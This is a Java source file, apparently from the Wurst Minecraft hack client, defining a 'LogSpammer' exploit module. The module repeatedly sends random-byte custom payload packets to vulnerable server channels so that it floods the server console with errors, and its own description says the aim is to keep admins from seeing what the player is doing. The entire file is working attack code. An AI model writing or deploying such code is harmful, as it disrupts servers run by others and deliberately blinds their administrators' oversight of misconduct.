/*
 * Copyright � 2014 - 2016 | Wurst-Imperium | All rights reserved.
 * 
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package tk.wurst_client.mods;

import io.netty.buffer.Unpooled;

import java.util.Random;

import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;
import tk.wurst_client.events.listeners.UpdateListener;
import tk.wurst_client.mods.Mod.Bypasses;
import tk.wurst_client.mods.Mod.Category;
import tk.wurst_client.mods.Mod.Info;

@Info(category = Category.EXPLOITS,
	description = "Fills the server console with errors so that admins can't see what you are doing.",
	name = "LogSpammer",
	help = "Mods/LogSpammer")
@Bypasses(ghostMode = false)
public class LogSpammerMod extends Mod implements UpdateListener
{
	private PacketBuffer payload;
	private Random random;
	private final String[] vulnerableChannels = new String[]{"MC|BEdit",
		"MC|BSign", "MC|TrSel", "MC|PickItem"};
	
	@Override
	public void onEnable()
	{
		random = new Random();
		payload = new PacketBuffer(Unpooled.buffer());
		
		byte[] rawPayload = new byte[random.nextInt(128)];
		random.nextBytes(rawPayload);
		payload.writeBytes(rawPayload);
		
		wurst.events.add(UpdateListener.class, this);
	}
	
	@Override
	public void onUpdate()
	{
		updateMS();
		if(hasTimePassedM(100))
		{
			mc.thePlayer.sendQueue.addToSendQueue(new CPacketCustomPayload(
				vulnerableChannels[random.nextInt(vulnerableChannels.length)],
				payload));
			updateLastMS();
		}
	}
	
	@Override
	public void onDisable()
	{
		wurst.events.remove(UpdateListener.class, this);
	}
}
